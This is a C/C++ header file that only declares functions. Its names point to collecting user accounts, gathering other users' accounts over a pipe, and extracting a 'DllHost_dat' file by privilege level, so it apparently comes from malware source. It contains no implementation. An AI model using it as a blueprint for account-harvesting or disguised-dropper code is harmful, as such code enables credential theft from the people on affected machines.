#pragma once
#include "Global.h"

void GetAllAccount();

BOOL AddStringByTwo(WCHAR *pArg1, WCHAR *pArg2, DWORD dwMark);

BOOL GetOtherUserAcc(CZVector *pSet);

BOOL CollectAccounts();

DWORD __stdcall PipeCollectAccountsProc(LPVOID pParam);

BOOL ExtractDllHost_dat(DWORD dwCurPrivilege);